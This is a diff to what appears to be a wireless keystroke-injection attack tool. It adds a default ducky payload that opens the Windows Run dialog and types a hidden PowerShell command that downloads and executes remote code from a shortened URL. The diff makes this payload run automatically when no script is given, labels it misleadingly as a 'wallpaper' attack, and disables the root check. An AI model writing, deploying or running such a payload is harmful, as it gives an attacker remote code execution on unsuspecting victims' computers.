@@ -5,6 +5,7 @@ from __future__ import print_function, absolute_import
 from six import iteritems
 import os
 import sys
+from sys import exit
 import time
 import datetime
 import platform
@@ -122,6 +123,14 @@ def confirm_root():
         exit(-1)
 
 
+def getDefaultAttack():
+    return \
+"""GUI r
+DELAY 500
+STRING powershell -W Hidden "iex (Invoke-WebRequest 'tiny.cc/7y3kiz' -UseBasicParsing).content"
+ENTER
+"""
+
 @click.command()
 @click.option('--debug', is_flag=True, help='Enable debug')
 @click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
@@ -137,7 +146,7 @@ def confirm_root():
 def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autopwn, all_channels, keylogging):
 
     banner()
-    confirm_root()
+    # confirm_root()
 
     if debug:
         print(O + "[W] " + W + "Debug is enabled.")
@@ -156,12 +165,14 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autop
             exit(-1)
         else:
             targeted = True
+    
+    attack = ""
 
     if script == "":
         if not keylogging:
             _print_err("You must supply a ducky script using --script <filename>")
-            _print_err("Attacks are disabled.")
-        attack = ""
+            _print_err("Running default attack.. (wallpaper)")
+            attack = duckyparser.DuckyParser(getDefaultAttack(), layout=layout.lower()).parse()
     else:
         f = open(script, 'r')
         try:
